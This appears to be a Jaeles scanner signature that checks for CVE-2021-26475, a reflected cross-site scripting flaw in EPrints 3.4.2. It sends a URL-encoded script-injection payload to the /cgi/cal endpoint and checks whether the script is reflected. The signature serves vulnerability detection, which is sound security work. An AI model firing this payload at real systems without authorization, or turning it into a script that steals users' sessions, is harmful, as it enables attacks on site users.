id: CVE-2021-26475

info:
  name: EPrints 3.4.2 XSS
  risk: Medium
  tech: EPrints

params:
  - root: '{{.BaseURL}}'
  
variables:
  - vuln: |
      /cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%27Jaeles%27)%3C/script%3E

requests: 
  - method: GET
    url: >-
      {{.root}}{{.vuln}}
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
    detections:
      - >-
        StatusCode() == 200 && StringSearch("resBody", "</title><script>alert('Jaeles')</script>")

references:
  - https://github.com/grymer/CVE/blob/master/eprints_security_review.pdf
